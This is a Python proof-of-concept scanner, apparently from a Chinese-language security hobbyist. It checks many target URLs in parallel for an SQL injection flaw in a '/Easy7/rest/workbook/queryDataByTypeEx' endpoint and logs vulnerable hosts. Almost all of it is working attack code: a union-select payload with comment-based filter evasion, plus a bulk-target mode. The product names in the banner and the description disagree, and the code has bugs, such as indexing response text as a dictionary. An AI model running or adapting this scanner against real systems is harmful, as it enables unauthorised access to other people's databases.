# poc 模板的写法
import argparse,sys,requests,json
import urllib3
import warnings
from multiprocessing.dummy import Pool # 多线程的库

# 禁用不安全请求警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def banner():
    test = """
░██       ░██ ░███     ░███   ░██████                 ░██████     ░██████   ░██         ░██
░██       ░██ ░████   ░████  ░██   ░██               ░██   ░██   ░██   ░██  ░██            
░██  ░██  ░██ ░██░██ ░██░██ ░██                     ░██         ░██     ░██ ░██         ░██
░██ ░████ ░██ ░██ ░████ ░██  ░████████               ░████████  ░██     ░██ ░██         ░██
░██░██ ░██░██ ░██  ░██  ░██         ░██                     ░██ ░██     ░██ ░██         ░██
░████   ░████ ░██       ░██  ░██   ░██               ░██   ░██   ░██   ░██  ░██         ░██
░███     ░███ ░██       ░██   ░██████   ░██████████   ░██████     ░██████   ░██████████ ░██
                                                                       ░██                 
                                                                        ░██                
                                                                      author:SIS2507
                                                                      version:1.0
                                                                      project:天地伟业sql                     
"""
    print(test)
def main():
    banner()
    # sqlmap 都需要通过命令行传递参数
    # 单个url和一个文件
    # 初始化
    parse = argparse.ArgumentParser(description="智联云仓WMS 存在SQL注入")

    # 添加命令行参数
    parse.add_argument('-u','--url',dest='url',type=str,help='please input your link')
    parse.add_argument('-f','--file',dest='file',type=str,help='please input your file')

    # 实例化
    args = parse.parse_args()

    # 对用户输入的参数做判断 输入正确 url file 输入错误弹出提示
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        #多线程处理
        url_list = []#用于接收文件之后的url
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print(f"Usage python {sys.argv[0]} -h")
def poc(target):
    link = "/Easy7/rest/workbook/queryDataByTypeEx?tabname=/*!TAB_WORKBOOK_TYPE*/where/**/1=1/**/union/**/select/**/md5(1),1 "
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.2609.50 Safari/537.36"
    }
    
    try:
        res1 = requests.get(url=target,headers=headers,verify=False,timeout=5)
        if res1.status_code == 200:
            res2 = requests.get(url=target+link,headers=headers,verify=False,timeout=5)
            
        
            if "c4ca4238a0b923820dcc509a6f75849b" in res2.text["errorMessage"]:
                print(f"[+]该{target}存在sql注入")
                    #把结果写入到一个文件
                with open('result.txt','a',encoding="utf-8") as f:
                    f.write(f"[+]该{target}存在sql注入,\n")
            else:
                print(f"[-]该{target}不存在sql注入")
    except:
        print(f"该{target}存在问题，请手工测试")  


  # 函数入口

if __name__ == "__main__":
    main()
